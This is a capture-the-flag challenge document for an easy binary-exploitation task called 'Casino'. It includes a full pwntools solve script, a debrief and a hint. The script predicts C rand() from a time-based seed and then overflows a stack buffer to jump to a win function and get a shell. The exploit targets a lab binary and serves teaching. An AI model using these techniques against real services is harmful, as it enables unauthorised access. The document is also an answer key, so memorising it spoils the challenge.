# Challenge Document


### Version: `0.1.0`
### Long Title: Casino
### Short Title: PWN01
### Author: Sasha Shaw
### Date: 07/08/2025
### Difficulty: Easy
### Learning objective: Learn how to break C rand() with predictable seed and perform a ret2win attack


## Challenge Brief (as its to be written in RIO):

Exploit the service and retrieve the flag at `/home/ctf/flag.txt`

## Solve:

```py
#!/usr/bin/python3
from pwn import *
from sys import argv
import ctypes

e = context.binary = ELF('./casino')
if len(argv) > 1:
    ip, port = argv[1].split(":")
    conn = lambda: remote(ip, port)
else:
    conn = lambda: e.process()

libc = ctypes.CDLL("libc.so.6")

p = conn()
libc.srand(libc.time(0))

money = 10
while money < 0x1337133713371337:
    print(hex(money))
    choice = libc.rand() % 37
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"Pick your number: ", str(choice).encode())
    p.sendlineafter(b"How much do you want to bet: ", str(money).encode())
    p.recvuntil(b"The wheel has landed on ")
    result = int(p.recvline())
    if choice != result:
        log.error(f"Gussed {choice}, landed on {result}")
        exit(1)
    money *= 36

p.sendlineafter(b"You need to get out of here, and quickly!", b"A"*0x88 + p64(e.sym.escape_casino))
p.interactive()
```

## Author Notes: 

## Debrief: 

The first part of the challenge involves attacking C's `rand()`.
We're inside a loop, where we can bet on a roulette wheel, where the numbers are decided using `rand() % 37`.
We need to win enough money before progressing, but to do this we need to be able to predict `rand()`'s output.

`rand()` is a pseudo-random number generator, so it will use a seed. If we were able to get this seed, the numbers from `rand()` would be predictable.
We see that it first calls `srand(time(NULL))`, which means it's getting the current time, and using that as the seed for `srand()`.
This seed is predictable by simply getting the current time on your system.
With the seed, we can repeatedly predict the exact number the wheel will land on, send that number, and win enough money to move on.

The second part is a buffer overflow on the stack.
This can be used to control the return address, which we use to jump to the `escape_casino()` function to get a shell.
The offset can be found either using De Brujn Sequences, debugging, or disassembling main.

## Hints: 

What does `srand(time(NULL))` do? Will this have any consequences on the predictability of the randomly generated numbers?
